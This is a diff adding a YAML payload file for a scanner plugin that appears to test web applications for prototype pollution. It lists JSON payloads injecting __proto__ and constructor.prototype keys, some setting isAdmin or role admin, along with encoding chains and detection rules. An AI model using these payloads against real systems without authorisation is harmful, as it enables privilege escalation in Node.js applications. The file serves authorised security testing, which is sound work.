@@ -1,0 +1,67 @@
+# Prototype Pollution Payloads Database
+# Plugin: core.injection.prototype_pollution
+
+plugin_id: core.injection.prototype_pollution
+mutation_type: field_injection
+payload_type: prototype_pollution
+
+variants:
+  # Variant 1: __proto__ pollution
+  - id: proto_pollution
+    payloads:
+      - {"__proto__": {"polluted": "yes"}}
+      - {"__proto__": {"isAdmin": true}}
+      - {"__proto__": {"role": "admin"}}
+    tech_stack: [javascript, nodejs, express]
+    confidence_boost: 0.22
+    detection: body_matches_any(polluted, admin, authenticated) OR response_headers_contains(polluted)
+    auto_variants:
+      encoding_chains:
+        - [json_unicode]
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 6
+
+  # Variant 2: constructor.prototype pollution
+  - id: constructor_pollution
+    payloads:
+      - {"constructor": {"prototype": {"polluted": "yes"}}}
+      - {"constructor": {"prototype": {"isAdmin": true}}}
+    tech_stack: [javascript, nodejs]
+    confidence_boost: 0.20
+    detection: body_matches_any(polluted, prototype)
+    auto_variants:
+      encoding_chains:
+        - [json_unicode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 3: Deep merge pollution
+  - id: deep_merge_pollution
+    payloads:
+      - {"a": {"__proto__": {"polluted": "yes"}}}
+      - {"nested": {"__proto__": {"isAdmin": true}}}
+    tech_stack: [javascript, nodejs]
+    confidence_boost: 0.18
+    detection: body_matches_any(polluted, merged)
+    auto_variants:
+      encoding_chains:
+        - [json_unicode]
+      obfuscation: []
+      max_combinations: 4
+
+keywords:
+  - json
+  - data
+  - config
+  - settings
+  - options
+  - params
+
+expected_results:
+  proto_pollution:
+    indicator: prototype_polluted
+    expected_output: "polluted"
+  constructor_pollution:
+    indicator: prototype_polluted
+    expected_output: "polluted"
